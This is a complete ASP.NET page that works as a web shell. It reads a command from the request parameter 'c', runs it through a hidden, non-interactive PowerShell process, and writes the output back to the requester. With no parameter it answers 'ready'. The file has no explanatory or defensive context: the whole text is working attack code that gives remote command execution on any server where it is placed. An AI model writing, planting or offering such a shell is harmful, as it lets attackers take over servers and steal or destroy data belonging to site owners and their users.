<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string c = Request["c"];
    if (string.IsNullOrEmpty(c)) { Response.Write("ready"); return; }

    try
    {
        var psi = new ProcessStartInfo("powershell.exe", "-NoP -NonI -W Hidden -Command \"" + c + "\"");
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        var p = Process.Start(psi);
        string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();
        Response.Write(o);
    }
    catch (Exception ex) { Response.Write("E:" + ex.Message); }
}
</script>
